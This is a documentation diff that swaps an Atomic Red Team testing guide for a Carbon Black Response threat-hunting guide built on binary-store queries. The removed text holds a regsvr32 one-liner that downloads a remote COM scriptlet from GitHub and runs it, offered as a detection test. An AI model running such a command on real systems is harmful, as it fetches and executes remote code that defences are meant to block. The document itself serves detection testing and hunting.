@@ -1,68 +1,52 @@
 ======================================
-Getting Started Testing with Atomic Tests
+Getting Started with Carbon Black Response and Hunting
 ======================================
 
-We suggest a phased cyclical approach to running a test and evaluating your results:
+Data analysis is a cyclical process. I recommend following a similar process:
 
-1. Select a test
-2. Execute Test
-3. Collect Evidence
-4. Develop Detection
+.. image:: https://redcanary.com/wp-content/uploads/ProcessFlow.png
+
+`reference blog post <https://redcanary.com/blog/carbon-black-response-with-splunk-advanced-data-analysis/>`
+
+1. Decide what to look for (hypothesis, situational awareness)
+2. Tune, focus query, Alert
+3. Investigate
+4. Tune alert
 5. Measure Progress
 
-Resources
-^^^^^^^^^
-- :doc:`Get started <Invoke-AtomicRedTeam>` with PowerShell Invoke-AtomicRedTeam
-- Additional execution frameworks may be found on the `repo <https://github.com/redcanaryco/atomic-red-team/tree/master/execution-frameworks>`_
-
-Best Practices
+Decide what to look for (hypothesis, situational awareness)
 ^^^^^^^^^
 
-* Be sure to get permission and necessary approval before conducting tests. Unauthorized testing is a bad decision and can potentially be a resume-generating event.
+With Carbon Black Response I start all my hunts with the binary store. Most analysts ignore it, but I find it to be one of the most important data collected.
 
-* Set up a test machine that would be similar to the build in your environment. Be sure you have your collection/EDR solution in place, and that the endpoint is checking in and active.
-
-* Spend some time developing a test plan or scenario. This can take many forms. An example test plan could be to execute all the Discovery phase items at once in a batch file, or run each phase one by one, validating coverage as you go.
-
-Select an Atomic Test
-^^^^^^^^^
-
-Select one or more Atomic Tests that you plan to execute. A complete list, ATT&CK matrices, and platform-specific matrices linking to Atomic Tests can be found here:
-
-* `Complete list of Atomic Tests <https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/index.md>`_
-* `Atomic Tests per the ATT&CK Matrix <https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/matrix.md>`_
-* Windows `Tests <https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/windows-index.md>`_ and `Matrix <https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/windows-matrix.md>`_
-* macOS `Tests <https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/macos-index.md>`_ and `Matrix <https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/macos-matrix.md>`_
-* Linux `Tests <https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/linux-index.md>`_ and `Matrix <https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/linux-matrix.md>`_
-
-Execute Test
-^^^^^^^^^
-
-In this example we will use Technique T1117 ``Regsvr32`` and Atomic Test ``Regsvr32 remote COM scriptlet execution``. This particular test is fairly easy to exercise since the tool is on all Windows workstations by default.
-
-The details of this test, which are located here, describe how you can test your detection by simply running the below command:
-
-From the Windows command prompt:
+Begin by viewing `Binary Queries <https://github.com/MHaggis/CBR-Queries/blob/master/binary.md>`. My most frequented query to start with is -
 
 .. code-block:: console
 
-    > regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll
+    > is_executable_image:"true"  digsig_result:"Unsigned"
 
+Microsoft caveats -
 
-Collect Evidence
+* catalog signed
+* Authenticode
+
+tl;dr - understand legitimate Microsoft binaries may be seen/found as "Unsigned".
+
+Back to our query above. Begin previewing all binaries. In CBR, by default our view shows us "company_name" under disig_status on the right. I compare the binary name + company_name. If company_name is not present on the right, does the binary name look legitimate? Is it camel case? Does it look suspicious?
+If the file raises suspicion, I will open it in a new tab and continue to review binary pages.
+If there is too many binaries to review, I will begin to narrow my search by using queries such as -
+
+.. code-block:: console
+
+    > is_executable_image:"true"  digsig_result:"Unsigned" observed_filename:c:\windows\temp\
+    > is_executable_image:"true"  digsig_result:"Unsigned" observed_filename:\appdata\local\temp\
+    > is_executable_image:"true"  digsig_result:"Unsigned" observed_filename:c:\windows\syswow64
+    > (observed_filename:"c:\windows\system32\" OR observed_filename:"c:\windows\syswow64\") is_executable_image:"true" digsig_result:"Unsigned"
+
+Notice the usage of ``observed_filename`` - this is similar to defining ``path`` in process search. Fortunately, in binary search we do not have to give it a filename, but just the path (``appdata\local\``).
+
+Identify Suspicious Drivers
 ^^^^^^^^^
-
-What does your security solution observe?
-
-* You may see a file modification in the user’s profile.
-* You may detect network connections made by regsvr32.exe to an external IP.
-* There may be an entry in the proxy logs.
-* You may observe the scrobj.dll loading on Windows.
-* Or you might not observe any behavior on the endpoint or network.
-
-This is why we test! We want to identify visibility gaps and determine where we need to make improvements.
-
-.. image:: https://www.redcanary.com/wp-content/uploads/image9-1.png
 
 
 .. toctree::
